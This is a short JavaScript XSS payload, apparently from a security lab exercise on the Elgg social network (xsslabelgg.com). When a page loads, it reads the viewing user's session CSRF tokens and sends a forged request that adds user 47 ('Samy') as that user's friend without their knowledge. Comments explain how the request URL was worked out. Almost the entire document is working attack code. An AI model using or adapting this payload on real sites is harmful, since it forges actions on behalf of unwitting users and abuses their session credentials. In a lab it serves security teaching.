<script type="text/javascript">
    window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.

    //http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624596421&__elgg_token=2_WZS3ILsYUwaD8ThZZ7iA&__elgg_ts=1624596421&__elgg_token=2_WZS3ILsYUwaD8ThZZ7iA
    //The link above is generated when a friend request to Samy is done
    //Same link is given in sendurl
    //add?friend=47 , So, Samy's Id is 47

    var samyID = 47;
    var ownerID = elgg.session.user.guid;  //current user ID from elgg session data from 'view page source'

    console.log(ownerID);
    console.log(samyID);

    
    if(samyID != ownerID)          //Checking if the current user is not Samy . As , the request not applicable for Samy
    {
        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=" + samyID + ts +  token +  ts +  token;  //generated the appropriate url

        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
    }
    }

</script>
